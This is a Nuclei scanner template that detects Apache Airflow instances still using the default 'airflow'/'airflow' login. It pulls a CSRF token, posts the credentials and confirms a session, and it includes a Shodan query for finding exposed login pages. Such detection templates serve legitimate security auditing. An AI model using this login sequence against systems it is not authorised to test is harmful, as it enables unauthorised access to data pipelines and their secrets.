id: airflow-default-login
info:
  author: pdteam
  metadata:
    shodan-query: title:"Sign In - Airflow"
  name: Apache Airflow Default Login
  reference: https://airflow.apache.org/docs/apache-airflow/stable/start/docker.html
  severity: critical
  tags: airflow,default-login,apache
requests:
- attack: pitchfork
  cookie-reuse: true
  extractors:
  - group: 1
    internal: true
    name: csrf_token
    regex:
    - type="hidden" value="(.*?)">
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_1, "Sign In - Airflow")
    - contains(all_headers_2, "session=.")
    - status_code_2 == 302
    type: dsl
  - type: word
    words:
    - 'You should be redirected automatically to target URL: <a href="/">'
  matchers-condition: and
  payloads:
    password:
    - airflow
    username:
    - airflow
  raw:
  - 'GET /login/ HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    '
  - 'POST /login/ HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}/admin/airflow/login


    username={{username}}&password={{password}}&_csrf_token={{csrf_token}}

    '
  req-condition: true
